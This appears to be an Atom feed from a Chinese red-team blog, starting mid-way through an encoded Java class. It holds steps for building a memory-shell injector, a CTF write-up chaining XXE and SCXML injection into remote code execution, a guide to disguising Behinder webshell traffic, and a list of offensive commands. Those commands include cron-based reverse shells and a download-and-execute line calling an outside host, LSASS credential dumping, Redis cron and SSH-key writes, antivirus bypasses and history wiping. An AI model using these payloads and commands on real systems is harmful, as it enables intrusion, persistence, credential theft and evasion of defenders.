kADwGNAQ4B%2FQH%2BABABkAELAcYBxwARAcsAAAAMAAEAJgJ1AcEBzAAGAUYAAAFlABv%2FAFYACQcBaQcBrwcBsAcB%2BQcBlQcCCwcB6gcBXQcAJAAA%2FAAaBwAkQAH9ACoBBwFdQAEBJf0AMAcCDAcCDPoAAPwAMgcCDPwAHQcAJPkABQf%2FAFIAEgcBaQcBrwcBsAcB%2BQcBlQcCCwcB6gcBXQcAJAcAJAEHAV0HAgwHAV0BAAcCDQcBzwAA9wBGBwFe%2FwAjABIHAWkHAa8HAbAHAfkHAZUHAgsHAeoHAV0HACQHACQBBwFdBwIMBwFdAQcB%2BQcCDQcBzwAA%2FwANABIHAWkHAa8HAbAHAfkHAZUHAgsHAeoHAV0HACQHACQBBwFdBwIMBwFdAQcB%2BQcCDQcBzwADBwFpBwH5BwIM%2FwAAABIHAWkHAa8HAbAHAfkHAZUHAgsHAeoHAV0HACQHACQBBwFdBwIMBwFdAQcB%2BQcCDQcBzwAEBwFpBwH5BwIMAQwJUAcBXgsJUAcBnP0ACwAHAZwJ%2BQAQATwAAAAEAAEAOwABAiIBLQABAS4AAABdAAQAAgAAABIqKrQACiq0AAsEtwEFpwAETLEAAQAAAA0AEAA7AAMBLwAAABIABAAAArQADQK4ABACtQARArkBMAAAAAwAAQAAABIBMQEyAAABRgAAAAcAAlAHAV4AAAgCIwHaAAIBLgAAAX4AAwAHAAAAdLsAtlm3ALdLuAEGTCu5AKoBAJkAXCu5AKsBAMABB00stgEITi25AKoBAJkAQS25AKsBAMABCToEGQS2AQo6BRkFxgAnGQUQJbYBCzYGFQYCnwANGQUDFQa2ADo6BSoZBQS4AQy2ALlXp%2F%2B8p%2F%2BhpwAETCqwAAEACABuAHEAOwAEAS8AAABKABIAAAK8AAgCvgAMAr8AFQLAAB8CwQAkAsIALQLDADgCxAA%2FAsUARALHAE0CyABTAskAXQLLAGgCzQBrAs4AbgLQAHECzwByAtEBMAAAAEgABwBNABsCJAFMAAYAOAAwAiUCJgAEAD8AKQFbASEABQAfAEwCJwIoAAIAJABHAikByQADAAwAYgIqAckAAQAIAGwBJAElAAABywAAACAAAwAkAEcCKQIrAAMADABiAioCLAABAAgAbAEkAScAAAFGAAAALAAI%2FQAMBwHqBwHQ%2FQAXBwItBwHQ%2FgA4BwIuBwFdAfgACvkAAvoAAkIHAV4AASYAAAACAi8AAAIwAjEAAgEuAAAAVgADAAMAAAAUuwCWWSu3AJe2AQ1NsgEOLLYBD6wAAAACAS8AAAAKAAIAAALVAAwC1gEwAAAAIAADAAAAFAExATIAAAAAABQBlAEhAAEADAAIAjIBIQACATwAAAAEAAEAOwABAjMCNAABAS4AAABAAAEAAwAAAAIErAAAAAIBLwAAAAYAAQAAAvIBMAAAACAAAwAAAAIBMQEyAAAAAAACAjUBIQABAAAAAgI2AjcAAgABAjgCOQACAS4AAAA%2FAAAAAwAAAAGxAAAAAgEvAAAABgABAAAC9gEwAAAAIAADAAAAAQExATIAAAAAAAEBqgI6AAEAAAABAjsBIQACATwAAAAEAAECPAABAj0COQACAS4AAAA%2FAAAAAwAAAAGxAAAAAgEvAAAABgABAAAC%2BQEwAAAAIAADAAAAAQExATIAAAAAAAEBqgI6AAEAAAABAjsBIQACATwAAAAEAAECPAABAj4CPwABAS4AAAAvAAEAAQAAAAUDvQEQsAAAAAIBLwAAAAYAAQAAAvwBMAAAAAwAAQAAAAUBMQEyAAAACQJAAkEAAgEuAAABTQAGAAUAAAB8AUwSFrgAF00sEwERAcABErYAHywBwABWtgAhTi22ACITARMEvQAeWQMSJFO2AB8tBL0AIFkDKlO2ACHAACpMpwA7ThMBFLgAF00stgAmOgQZBLYAIhMBFQS9AB5ZAxIkU7YAHxkEBL0AIFkDKlO2ACHAACpMpwAFOgQrsAACAAIAPwBCADsAQwB1AHgAOwADAS8AAAAyAAwAAAMBAAIDBQAIAwYAHAMHAD8DDwBCAwgAQwMKAEoDCwBQAwwAdQMOAHgDDQB6AxEBMAAAAEgABwAcACMCQgFCAAMACAA6AT0BQAACAFAAJQJCAUIABABKAC4BPQFAAAIAQwA3AkMBYgADAAAAfAH4ATsAAAACAHoB4wEhAAEBRgAAACkAA%2F8AQgACBwAkBwFdAAEHAV7%2FADUABAcAJAcBXQAHAV4AAQcBXvkAAQE8AAAABAABADsAAQJEATcAAgEuAAABAAAGAAUAAAB8EwEWuAAXTSwSLgS9AB5ZAxIqU7YAHyy2ACYEvQAgWQMrU7YAIcAAJMAAJMAAJMAAJLBNEha4ABdOLRMBFwO9AB62AB8BA70AILYAIToEGQS2ACITARgEvQAeWQMSKlO2AB8ZBAS9ACBZAytTtgAhwAAkwAAkwAAkwAAksAABAAAAMQAyADsAAwEvAAAAGgAGAAADFwAHAxgAMgMZADMDGgA5AxsATgMcATAAAAA%2BAAYABwArAW4BQAACADkAQwFuAUAAAwBOAC4CRQFCAAQAMwBJAkYBYgACAAAAfAExATIAAAAAAHwCRwEhAAEBRgAAAAYAAXIHAV4BPAAAAAQAAQA7AAgCSAEtAAEBLgAAAB8AAQAAAAAAB7gBGbMBDrEAAAABAS8AAAAGAAEAAAAkAAICSQAAAAICSgGNAAAACgABAYsDWwGMBgk%3D&quot;);
复制代码
</code></pre>
<ul>
<li>第四步，将生成的Base64编码，添加到MEM_TOOLS的Map中即可：</li>
</ul>
<figure data-type="image" tabindex="6"><a href="https://loecho.oss-cn-beijing.aliyuncs.com/Bolg/202304021852071.png"><img src="https://loecho.oss-cn-beijing.aliyuncs.com/Bolg/202304021852071.png" alt="img" loading="lazy"></a></figure>
<ul>
<li>第五步，修改 <code>com/summersec/attack/UI/MainController.java</code> 来是我们点击按钮时调用到对应的功能，新增一个就行，名字要与刚才Map的Key对应：</li>
</ul>
<figure data-type="image" tabindex="7"><a href="https://loecho.oss-cn-beijing.aliyuncs.com/Bolg/202304021852381.png"><img src="https://loecho.oss-cn-beijing.aliyuncs.com/Bolg/202304021852381.png" alt="img" loading="lazy"></a></figure>
<ul>
<li>第六步，修改<code>com/summersec/attack/core/AttackService.java</code>的 <code>injectMem</code>方法，对注入的<code>SUO5Filter</code>进行判断和处理：</li>
</ul>
<figure data-type="image" tabindex="8"><a href="https://loecho.oss-cn-beijing.aliyuncs.com/Bolg/202304021852574.png"><img src="https://loecho.oss-cn-beijing.aliyuncs.com/Bolg/202304021852574.png" alt="img" loading="lazy"></a></figure>
<h2 id="0x03-测试效果">0x03 测试效果</h2>
<ul>
<li>就用vulhub 的 Shiro + Spring 环境 注入Filter测试：</li>
</ul>
<figure data-type="image" tabindex="9"><a href="https://loecho.oss-cn-beijing.aliyuncs.com/Bolg/202304021859542.png"><img src="https://loecho.oss-cn-beijing.aliyuncs.com/Bolg/202304021859542.png" alt="img" loading="lazy"></a></figure>
<ul>
<li>测试联通性，记得添加Header：</li>
</ul>
<figure data-type="image" tabindex="10"><a href="https://loecho.oss-cn-beijing.aliyuncs.com/Bolg/202304021852077.png"><img src="https://loecho.oss-cn-beijing.aliyuncs.com/Bolg/202304021852077.png" alt="img" loading="lazy"></a></figure>
<ul>
<li>连接成功：</li>
</ul>
<figure data-type="image" tabindex="11"><a href="https://loecho.oss-cn-beijing.aliyuncs.com/Bolg/202304021852784.png"><img src="https://loecho.oss-cn-beijing.aliyuncs.com/Bolg/202304021852784.png" alt="img" loading="lazy"></a></figure>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[CTF：Java环境xxe结合jar协议缓存实现RCE]]></title>
        <id>https://1oecho.github.io/LfXdtONwu/</id>
        <link href="https://1oecho.github.io/LfXdtONwu/">
        </link>
        <updated>2023-04-05T10:00:47.000Z</updated>
        <content type="html"><![CDATA[<h2 id="0x00-漏洞环境">0x00 漏洞环境</h2>
<ul>
<li>题目文件:</li>
</ul>
<pre><code>http://loecho.oss-cn-beijing.aliyuncs.com/loecho-File/CTF/xxe.jar
</code></pre>
<h2 id="0x01-代码分析">0x01 代码分析</h2>
<figure data-type="image" tabindex="1"><a href="https://loecho.oss-cn-beijing.aliyuncs.com/Bolg/202304021716571.png"><img src="https://loecho.oss-cn-beijing.aliyuncs.com/Bolg/202304021716571.png" alt="img" loading="lazy"></a></figure>
<p><strong>object方法</strong></p>
<p>object方法通过@RequestParam注解获取object参数，然后根据该参数拼接出一个文件路径file:///home + object。接着调用check方法检查该文件是否存在 <code>&lt;script&gt;</code> 标签，如果存在则返回 X E , X E , XX E;<br>
否则读取该文件并将其解析为SCXML状态机，然后执行该状态机并返回 `X ME</p>
<p><strong>check方法</strong></p>
<p>该方法用于检查文件中是否存在<code>&lt;script&gt;</code>标签。</p>
<p>首先通过DocumentBuilderFactory.newInstance()创建一个DocumentBuilderFactory实例，然后通过newDocumentBuilder()方法创建一个DocumentBuilder实例。</p>
<p>接着使用builder.parse(fileName)方法将文件解析为一个Document对象，最后通过getElementsByTagName(&quot;script&quot;)方法获取所有<code>&lt;script&gt;</code>标签元素并检查其数量，如果为0，则返回<code>true</code>，否则返回<code>false</code>。</p>
<p><strong>xxe方法</strong></p>
<p>xxe方法通过<code>@RequestParam</code>注解获取uri参数，然后使用<code>DocumentBuilder</code>将该参数解析为一个<code>Document</code>对象。接着遍历该<code>Document</code>对象的所有子节点，并将其文本内容连接起来返回。由于没有对解析出来的文本进行任何过滤或验证，因此存在XXE漏洞。</p>
<h2 id="0x02-漏洞利用">0x02 漏洞利用</h2>
<ul>
<li>object方法中存在SCXML解析漏洞，攻击者可以通过object参数构造一个包含恶意SCXML状态机的文件，从而在服务器上执行任意代码。</li>
<li>xxe方法中存在XXE漏洞，攻击者可以通过uri参数构造一个恶意XML文件，从而读取服务器上的任意文件。</li>
</ul>
<p>通过xxe读取根目录，发现readflag，也可以列目录获取缓存文件地址：</p>
<figure data-type="image" tabindex="2"><a href="https://loecho.oss-cn-beijing.aliyuncs.com/Bolg/202304021716808.png"><img src="https://loecho.oss-cn-beijing.aliyuncs.com/Bolg/202304021716808.png" alt="img" loading="lazy"></a></figure>
<p>通过jar协议缓存文件特点，通过工具使文件解压后不删除，通过xxe列目录获取tmp文件路径</p>
<p>https://github.com/pwntester/BlockingServer</p>
<figure data-type="image" tabindex="3"><a href="https://loecho.oss-cn-beijing.aliyuncs.com/Bolg/202304021716324.png"><img src="https://loecho.oss-cn-beijing.aliyuncs.com/Bolg/202304021716324.png" alt="img" loading="lazy"></a></figure>
<p>构造命令执行,通过<code>assign</code>绕过<code>script</code>标签过滤：</p>
<ul>
<li>Payload</li>
</ul>
<pre><code class="language-xml">&lt;?xml version=&quot;1.0&quot;?&gt;
&lt;scxml xmlns=&quot;http://www.w3.org/2005/07/scxml&quot; version=&quot;1.0&quot; initial=&quot;state1&quot;&gt;
    &lt;state id=&quot;state1&quot;&gt;
        &lt;onentry&gt;
            &lt;assign location=&quot;command&quot; expr=&quot;''.getClass().forName('java.lang.Runtime').getMethod('exec',''.getClass()).invoke(''.getClass().forName('java.lang.Runtime').getMethod('getRuntime').invoke(null),'open -a calculator')&quot; /&gt;
        &lt;/onentry&gt;
    &lt;/state&gt;
&lt;/scxml&gt;
</code></pre>
<ul>
<li>目录穿越指定缓存文件</li>
</ul>
<pre><code>POST /object HTTP/1.1
Host: 192.168.2.42:8080
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 126

object=../../../../../../../../../../private/var/folders/86/8qfmjpl965j4x4ykyk1sfkf80000gn/T/jar_cache12949212024815436877.tmp
</code></pre>
<figure data-type="image" tabindex="4"><a href="https://loecho.oss-cn-beijing.aliyuncs.com/Bolg/202304021716316.png"><img src="https://loecho.oss-cn-beijing.aliyuncs.com/Bolg/202304021716316.png" alt="img" loading="lazy"></a></figure>
<ul>
<li>通过el表达式，注入内存马：</li>
</ul>
<pre><code class="language-XML">&lt;?xml version=&quot;1.0&quot;?&gt;
&lt;scxml xmlns=&quot;http://www.w3.org/2005/07/scxml&quot; version=&quot;1.0&quot; initial=&quot;state1&quot;&gt;
  &lt;state id=&quot;state1&quot;&gt;
    &lt;onentry&gt;
      &lt;assign location=&quot;command&quot; expr=&quot;''.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('js').eval('var classLoader = java.lang.Thread.currentThread().getContextClassLoader();try{classLoader.loadClass(\'Injext\').newInstance();}catch (e){var clsString = classLoader.loadClass(\'java.lang.String\');var bytecodeBase64 = \'\';var bytecode;try{var clsBase64 = classLoader.loadClass(\'java.util.Base64\');var clsDecoder = classLoader.loadClass(\'java.util.Base64$Decoder\');var decoder = clsBase64.getMethod(\'getDecoder\').invoke(base64Clz);bytecode = clsDecoder.getMethod(\'decode\', clsString).invoke(decoder, bytecodeBase64);} catch (ee) {try {var datatypeConverterClz = classLoader.loadClass(\'javax.xml.bind.DatatypeConverter\');bytecode = datatypeConverterClz.getMethod(\'parseBase64Binary\', clsString).invoke(datatypeConverterClz, bytecodeBase64);} catch (eee) {var clazz1 = classLoader.loadClass(\'sun.misc.BASE64Decoder\');bytecode = clazz1.newInstance().decodeBuffer(bytecodeBase64);}}var clsClassLoader = classLoader.loadClass(\'java.lang.ClassLoader\');var clsByteArray = (new java.lang.String(\'a\').getBytes().getClass());var clsInt = java.lang.Integer.TYPE;var defineClass = clsClassLoader.getDeclaredMethod(\'defineClass\', [clsByteArray, clsInt, clsInt]);defineClass.setAccessible(true);var clazz = defineClass.invoke(classLoader,bytecode,new java.lang.Integer(0),new java.lang.Integer(bytecode.length));clazz.newInstance();}')&quot; /&gt;
        &lt;/onentry&gt;
        &lt;/state&gt;
        &lt;/scxml&gt;
</code></pre>
<figure data-type="image" tabindex="5"><a href="https://loecho.oss-cn-beijing.aliyuncs.com/Bolg/202304021716771.png"><img src="https://loecho.oss-cn-beijing.aliyuncs.com/Bolg/202304021716771.png" alt="img" loading="lazy"></a></figure>
<h2 id="0x03-其他标签">0x03 其他标签：</h2>
<p><code>&lt;assign&gt;</code>标签</p>
<pre><code class="language-xml">&lt;?xml version=&quot;1.0&quot;?&gt; 
&lt;scxml xmlns=&quot;http://www.w3.org/2005/07/scxml&quot; version=&quot;1.0&quot;&gt;   
  &lt;state id=&quot;example&quot;&gt;     
    &lt;onentry&gt;       
      &lt;assign location=&quot;test&quot; expr=&quot;''.getClass().forName('java.lang.Runtime').getMethod('exec',''.getClass()).invoke(''.getClass().forName('java.lang.Runtime').getMethod('getRuntime').invoke(null),'open -a calculator')&quot;/&gt;
    &lt;/onentry&gt;   
  &lt;/state&gt; 
&lt;/scxml&gt;
</code></pre>
<p><code>&lt;log&gt;</code>标签：</p>
<pre><code class="language-xml">&lt;?xml version=&quot;1.0&quot;?&gt;
&lt;scxml xmlns=&quot;http://www.w3.org/2005/07/scxml&quot; version=&quot;1.0&quot;&gt;
  &lt;state id=&quot;example&quot;&gt;
    &lt;onentry&gt;
      &lt;log expr=&quot;''.getClass().forName('java.lang.Runtime').getMethod('exec',''.getClass()).invoke(''.getClass().forName('java.lang.Runtime').getMethod('getRuntime').invoke(null),'open -a calculator')&quot;/&gt;
    &lt;/onentry&gt;
  &lt;/state&gt;
&lt;/scxml&gt;
</code></pre>
<p><code>&lt;raise&gt;</code>标签：</p>
<pre><code class="language-xml">&lt;?xml version=&quot;1.0&quot;?&gt;
&lt;scxml xmlns=&quot;http://www.w3.org/2005/07/scxml&quot; version=&quot;1.0&quot;&gt;
  &lt;state id=&quot;state1&quot;&gt;
    &lt;transition target=&quot;state2&quot;/&gt;
  &lt;/state&gt;
  &lt;state id=&quot;state2&quot;&gt;
    &lt;onentry&gt;
      &lt;log expr=&quot;''.getClass().forName('java.lang.Runtime').getMethod('exec',''.getClass()).invoke(''.getClass().forName('java.lang.Runtime').getMethod('getRuntime').invoke(null),'open -a calculator')&quot;/&gt;
    &lt;/onentry&gt;
  &lt;/state&gt;
  &lt;state id=&quot;state3&quot;&gt;
    &lt;onentry&gt;
      &lt;raise event=&quot;myevent&quot;/&gt;
    &lt;/onentry&gt;
  &lt;/state&gt;
  &lt;transition target=&quot;state1&quot; event=&quot;myevent&quot;/&gt;
&lt;/scxml&gt;
</code></pre>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[ 红队开发: Behinder3-Beta11 实战下的二次开发 （3）]]></title>
        <id>https://1oecho.github.io/fjA1kdB4U/</id>
        <link href="https://1oecho.github.io/fjA1kdB4U/">
        </link>
        <updated>2022-04-13T18:11:32.000Z</updated>
        <content type="html"><![CDATA[<h2 id="0x01-实现功能">0x01 实现功能</h2>
<ul>
<li>封装各类传输的数据头，PNG/AVI/JPEG</li>
<li>实现自定义的webshell的连接</li>
</ul>
<h2 id="0x02-实现细节">0x02 实现细节：</h2>
<ul>
<li>数据传输过程中的修改方式，原版webshell不需要修改</li>
</ul>
<p>为了我们后续实际使用方便，直接新建一个<code>webshell</code>连接类型，按照我们的需要，后续直接修改对应的类型即可</p>
<p><strong>1. 首先我们复制<code>原版jsp</code>下的类，新建一个自定义的<code>webshell</code>类型,以<code>diy_jsp</code>为例：</strong></p>
<figure data-type="image" tabindex="1"><img src="https://tva1.sinaimg.cn/large/e6c9d24ely1h18lgjlgunj210h0u078x.jpg" alt="image-20220414011155195" loading="lazy"></figure>
<p>修改webshell各类功能在传输过程中的加密方法，你用到的所有功能都需要修改，意味着所有的类都需要修改下，具体修改DIY类型下所有的<code>Encrypt（）</code>方法</p>
<p>（觉得麻烦的话，完全可以自定义一个<code>Encrypt方法</code>，后续所有的功能直接调用你新增的方法即可）</p>
<figure data-type="image" tabindex="2"><img src="https://tva1.sinaimg.cn/large/e6c9d24ely1h18m4cyah6j21u00j4q88.jpg" alt="image-20220414013450656" loading="lazy"></figure>
<ul>
<li>原版直接获取字节码，我们修改就将，新增数据拼接到原数据前后即可，以<code>视频流</code>的开头为例：（想添加什么头，自己定义即可）</li>
</ul>
<pre><code class="language-java">前： UklGRmYKAQBBVkkgTElTVMAAAABoZHJsYXZpaDgAAAA1ggAAoDwAAAAAAAAQCAAAoQAAAAAAAAABAAAABw8AALgBAAB8AQ  新增bytep[]长度：72
</code></pre>
<figure data-type="image" tabindex="3"><img src="https://tva1.sinaimg.cn/large/e6c9d24ely1h18m2hl3kjj21mk0n4gon.jpg" alt="image-20220414013302722" loading="lazy"></figure>
<pre><code class="language-java">后： /9k=	   新增 byte[] 长度：2
</code></pre>
<figure data-type="image" tabindex="4"><img src="https://tva1.sinaimg.cn/large/e6c9d24ely1h18m3mbsrrj22730u0jug.jpg" alt="image-20220414013408361" loading="lazy"></figure>
<h5 id="2-修改paramsjava的逻辑使我们新创建的类型能够在实现功能时调用到对应的类直接复制原版的函数新建一个修改下路径方法名即可">2. 修改<code>Params.java</code>的逻辑，使我们新创建的类型能够在实现功能时，调用到对应的类,直接复制原版的函数，新建一个，修改下路径/方法名即可</h5>
<figure data-type="image" tabindex="5"><img src="https://tva1.sinaimg.cn/large/e6c9d24ely1h18lok6kufj21mw0u0guk.jpg" alt="image-20220414011939249" loading="lazy"></figure>
<p><strong>3. 修改原有的加解密方法，我们只封装一个文件头测试，实际可以自定义加解密方法，以及webshell的实现流程</strong></p>
<p>新增一个解密方法，大致逻辑不变，只修改我们在本地接class字节码的有效范围，原版直接解密获取到字节码，修改版我们需要去掉新增文件头的那部分数据，只取有效的哪部分即可：</p>
<ul>
<li>新增数据： 开头-byte[] 长度72 后部分 byte[] 长度 2</li>
<li>新建解密方法，取的时候，定义好取的部分即可</li>
<li>新增静态方法中的调用</li>
</ul>
<figure data-type="image" tabindex="6"><img src="https://tva1.sinaimg.cn/large/e6c9d24ely1h18mcals7ej22bu0l4wj6.jpg" alt="image-20220414014227896" loading="lazy"></figure>
<figure data-type="image" tabindex="7"><img src="https://tva1.sinaimg.cn/large/e6c9d24ely1h18me7ycr8j228h0u0gsk.jpg" alt="image-20220414014419293" loading="lazy"></figure>
<p><strong>4. 最后一步，修改UI下的方法，以及Utils下的插件调用功能</strong></p>
<ul>
<li>新增连接选项</li>
</ul>
<figure data-type="image" tabindex="8"><img src="https://tva1.sinaimg.cn/large/e6c9d24ely1h18mgwf2ytj21qo0u0n4e.jpg" alt="image-20220414014653736" loading="lazy"></figure>
<ul>
<li>获取插件数据的方法，新增即可</li>
</ul>
<figure data-type="image" tabindex="9"><img src="https://tva1.sinaimg.cn/large/e6c9d24ely1h18mi7o5eej21q50u0n4i.jpg" alt="image-20220414014809374" loading="lazy"></figure>
<ul>
<li>
<p>运行Main方法，发现已经成功添加新类型，我们后续的传输就按照自定义的方式去进行了，</p>
<p>实战发挥脑洞，修改加解密方法，修改参数获取方法，修改传输过程中方式等等....</p>
</li>
</ul>
<figure data-type="image" tabindex="10"><img src="https://tva1.sinaimg.cn/large/e6c9d24ely1h18mlx5l50j21pi0u00wq.jpg" alt="image-20220414015143023" loading="lazy"></figure>
<ul>
<li>数据传输</li>
</ul>
<figure data-type="image" tabindex="11"><img src="https://tva1.sinaimg.cn/large/e6c9d24ely1h18n2usoohj21oc0u04l8.jpg" alt="image-20220414020759617" loading="lazy"></figure>
<h2 id="0x03-实际使用">0x03 实际使用</h2>
<ol>
<li>将所有数据进行混淆，修改加解密方法</li>
<li>修改为参数传递，不直接传输数据，改为各类参数传递，伪造为正常业务流量</li>
</ol>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[攻防实战：实战TIPS集合（持续更新）]]></title>
        <id>https://1oecho.github.io/voS1XhbeA/</id>
        <link href="https://1oecho.github.io/voS1XhbeA/">
        </link>
        <updated>2022-02-10T07:39:09.000Z</updated>
        <content type="html"><![CDATA[<p>[TOC]</p>
<ul>
<li><a href="#%E7%BA%A2%E9%98%9F">红队</a></li>
</ul>
<h2 id="jar-抓包">JAR 抓包</h2>
<pre><code>java -DproxySet=true -DproxyHost=127.0.0.1 -DproxyPort=8888 -jar 你的jar包

</code></pre>
<h2 id="powershell免杀案例">Powershell免杀，案例：</h2>
<pre><code>cmd /c echo set-alias -name xz -value IEX;x^z (New-Object
&quot;NeT.WeBClienT&quot;).d^o^w^n^l^o^a^d^s^t^r^i^n^g('ht'+'tP://19’+'2.168.190.12'+'8/
a') | p^o^w^e^r^s^h^e^l^l -
</code></pre>
<h2 id="简易的linux键盘记录">简易的Linux键盘记录：</h2>
<pre><code class="language-bash"># 添加倒数第二行即可，结果查看/tmp/test

if [ -f /tmp/script.lock ];then
        rm /tmp/script.lock
else
        echo lock &gt; /tmp/script.lock
        exec script -B /tmp/test -aqf
fi
</code></pre>
<h2 id="苛刻windows命令执行">苛刻Windows命令执行：</h2>
<p>这个方法在内网中比较常用吧，有个命令执行的点，有360一类的杀软，<br>
又不好写shell，可以直接利用comsvcs.dll 的导出函数dump lsass内存，<br>
把结果放到目标web目录下，下载解密即可。</p>
<p><code>https://twitter.com/PythonResponder/status/1385064506049630211</code></p>
<ul>
<li>Remote LSASS dump without touching local disk? Yes 😃</li>
<li>On target run:</li>
<li>
<ol>
<li>net use x: \smbserver_under_your_control\c$<br>
<img src="http://showdoc.wiki.com.qax/server/index.php?s=/api/attachment/visitFile/sign/1e75a81855e3f6dc58fdec177ef39e3d" alt="" loading="lazy"></li>
</ol>
</li>
<li>
<ol start="2">
<li>powershell -c rundll32.exe C:\windows\System32\comsvcs.dll MiniDump (Get-Process lsass).id x:\lassdump.bin ful</li>
</ol>
</li>
</ul>
<h2 id="java任意文件读取获取源码方式">java任意文件读取，获取源码方式</h2>
<pre><code># 读取文件：

/var/lib/mlocate/mlocate.db 

# 筛选对应war包即可
</code></pre>
<h2 id="查找web路径">查找web路径：</h2>
<pre><code>方法一 ：打开web查看源码，复制一个特征字符串，然后替换进下面命令的htmlString搜索之。

Win ：findstr /s/i/n /d:E:\code\xampp\htdocs\ /c:”htmlString” *.*
Linux：find / -name “.” | xargs grep”htmlString”

方法二 ：对于linux系统，我们也可以尝试通过history命令去查找，同样的也可以去看.bash_history

history | grep -E ‘cd|vi|ed|nano|et|mkdir|rm|find|ls|mv’ |grep -v grep | grep -E ‘www|html|nginx|apache|php|lighttp|web’ -i

方法三 ：windows系统中也可以使用dir去匹配一个特征文件名

dir /s/a-d/b E:\code\xampp\htdocs\*重复度较低的文件名（支持通配符


</code></pre>
<h2 id="linux短期权限维持">Linux短期权限维持</h2>
<pre><code class="language-bash">(crontab -l;echo '*/60 * * * * rm /tmp/yum.log;mkfifo /tmp/yum.log;cat /tmp/yum.log|/bin/sh -i 2&gt;&amp;1|/usr/bin/nc  -w 3 118.118.118.118 53 &gt;/tmp/yum.log')|crontab -
(crontab -l;echo '*/5 * * * * rm /tmp/yum.log;mkfifo /tmp/yum.log;cat /tmp/yum.log|/bin/sh -i 2&gt;&amp;1|/usr/bin/nc 118.118.118.118 53 &gt;/tmp/yum.log')|crontab -

(crontab -l;echo '*/1 * * * * exec 9&lt;&gt; /dev/tcp/118.118.118.118/53;exec 0&lt;&amp;9;exec 1&gt;&amp;9 2&gt;&amp;1;/bin/bash --noprofile -i')|crontab -

</code></pre>
<h2 id="简单操作">简单操作</h2>
<pre><code>unset HISTORY HISTFILE HISTSAVE HISTZONE HISTORY HISTLOG; export HISTFILE=/dev/null; export HISTSIZE=0; export HISTFILESIZE=0
python -c 'import pty; pty.spawn(&quot;/bin/sh&quot;)'
ssh -C -f -N -g -R 3389:10.0.0.1:3389 gg@118.118.118.118

plink.exe -C -N -R 3389:127.0.0.1:3389 gg@118.118.118.118 -pw 123456 -P 443

set 0 &quot;\n\n\n* * * * * bash -i &gt;&amp; /dev/tcp/118.118.118.118/53 0&gt;&amp;1\n\n\n&quot;
config set dir /var/spool/cron
config set dbfilename root
save
config set dir /var/lib/redis
config set dbfilename dump.rdb

cat foo.txt | redis-cli -h 10.10.10.10 -x set 0
config set dir /root/.ssh
config set dbfilename &quot;authorized_keys&quot;

</code></pre>
<h2 id="windows-文件下绕过360方式">Windows 文件下绕过360方式：</h2>
<pre><code># 证书下载绕过：

1. 将路径下的certutil.exe ，复制出来，利用复制出的新的进行下载操作，并列执行俩次

copy C:\Windows\System32\certutil.exe sb.exe

sb.exe&amp;&amp;sb.exe -urlcache -split -f http://vpsIP/a.txt &amp;&amp; a.exe

2. 修改下载的路径，通过定义变量，拼接变量，来下载文件

3. 通过echo写入一个exe的hex编码，通过certutil.exe转为exe



</code></pre>
<h2 id="openssl-反弹-加密webshell">openssl 反弹 加密webshell</h2>
<figure data-type="image" tabindex="1"><img src="https://loecho.oss-cn-beijing.aliyuncs.com/202111082303206.png" alt="" loading="lazy"></figure>
<pre><code>＃　生成自签名证书

openssl req -x509 -newkey rsa:2048 -keyout key.pem -out cert.pem -days 365 -nodes

＃　服务端启动监听　8888端口：

openssl s_server -quiet -key key.pem -cert cert.pem -port 8888


＃　Ｌinux　反弹ｓｈｅｌｌ：

mkfifo /tmp/s; /bin/sh -i &lt; /tmp/s 2&gt;&amp;1 | openssl s_client -quiet -connect Your ip:Your port&gt; /tmp/s; rm /tmp/s


</code></pre>
<h2 id="sqlmap-mssql-时间盲注布尔盲注-写webshell">Sqlmap mssql-时间盲注/布尔盲注 写webshell</h2>
<figure data-type="image" tabindex="2"><img src="http://showdoc.wiki.com.qax/server/index.php?s=/api/attachment/visitFile/sign/eb12be3afdcdc64fb4abbdf1fa85afd5" alt="" loading="lazy"></figure>
<pre><code># Windows 环境：

1. 找一个 特征文件： nb.jsp

2. dir /s /b index_sb.asp # 确定路径

3. for /r &quot;D:&quot; %i in (*.ashx) do echo %i # 第二种确定路径的方式

4. 直接echo

</code></pre>
<h3 id="vcenter">vcenter</h3>
<pre><code>1. getshell后通过dump内存，查找登录密码

run procdump64.exe -accepteula -ma vpxd.exe vpxd.dmp

2. 通过`PySharpSphere`dump内部主机Hash，上线

https://github.com/RicterZ/PySharpSphere

3. 通过dump数据库，获取Cookies，伪造登录

https://github.com/horizon3ai/vcenter_saml_login

</code></pre>
<h4 id="提取页面中url">提取页面中URL：</h4>
<pre><code class="language-javascript">var urls=$$('a');for(url in urls){console.log(&quot;%c#&quot;+url+&quot; - %c&quot;+urls[url].innerHTML +&quot; -- %c&quot;+urls[url].href,&quot;color:red;&quot;,&quot;color:green;&quot;,&quot;color:blue;&quot;);}
</code></pre>
<h4 id="搜索引擎语法httpsblogcsdnnetweixin_45116657articledetails102761464">搜索引擎语法：https://blog.csdn.net/weixin_45116657/article/details/102761464</h4>
<h1 id="红队">红队</h1>
<p>拿下 linux 机器,可以运行下 <code>last</code> 如果是内网机器,可以发现运维管理员的 ip 段,精准定位目标</p>
<p>也可以看下防火墙信息 <code>iptables --list</code> 也会有所收获</p>
<hr>
<p>翻数据库密码可以注意 <code>history</code> 记录也可以看下 <code>/root/.mysql_history</code> 文件</p>
<hr>
<p>偶尔跑1、2个脚本安装一下模块还是挺恼人的</p>
<p>如果经常写 python 脚本,可以使用 pipreqs 生成自己的 requirements.txt 文件,这样方便在更换主机的时候快速部署好运行环境</p>
<hr>
<h2 id="浏览器内打开-cmd">浏览器内打开 cmd</h2>
<pre><code>ms-settings:clipboard?activationSource=
</code></pre>
<h2 id="火狐">火狐</h2>
<pre><code>telnet:///
irc:///
ircs:///
mailto:///
webcal:///
</code></pre>
<hr>
